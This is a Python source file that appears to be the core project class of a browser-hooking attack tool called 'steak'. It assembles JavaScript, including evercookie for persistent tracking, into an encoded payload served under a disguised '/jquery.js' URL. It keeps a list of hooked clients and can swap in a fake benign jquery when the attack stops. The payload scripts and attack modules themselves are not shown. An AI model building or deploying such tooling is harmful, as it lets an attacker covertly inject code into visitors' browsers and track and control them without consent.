import importlib
from queue import Queue
from steak.utils import steak_format
class Project:
    def __init__(self) -> None:
        print('project init')
        self.clients={}
        self.jsurl='/jquery.js'
        self.jslist=['jquery.js','evercookie.js','swfobject-2.2.min.js','base64.js','main.js']
        self.encoder_list=['nothing']
        self.js_payload=''
        self.stopattack=False
        self.fakejs_list=['jquery.js']
        pass

    def readjs(self,jsname):
        return open('./steak/sources/'+jsname).read()
    

    def encode_js(self,content):
        if isinstance(self.jslist[0],str):
            self.encoder_list=[importlib.import_module('steak.encoders.'+encodername).encode for encodername in self.encoder_list]
        for encodefunc in self.encoder_list:
            content=encodefunc(content)
        return content 

    def set_js_payload(self,content):
        self.js_payload=self.encode_js(content)    

    def generate_js(self,callbackpath,jsurl):
        if self.js_payload or self.stopattack:
            return self.js_payload
        self.set_js_payload(steak_format(';\n'.join([self.readjs(jsname) for jsname in self.jslist]),callbackpath=callbackpath,jsurl=jsurl))
        return self.generate_js(callbackpath,jsurl)

    def stop_attack(self,fakejslist=['jquery.js']):
        self.stopattack=True
        self.set_js_payload(';\n'.join([self.readjs(jsname) for jsname in fakejslist]))
        for clientid in self.clients:
            self.clients[clientid].stop_attack()

    def attack_client(self,client:object):
        return
    
    
    def load_module(self,modulename:str,*args,**kwargs):
        moduleobj=getattr(importlib.import_module(f'steak.modules.{modulename}.module'),modulename)
        return moduleobj(*args,**kwargs)
    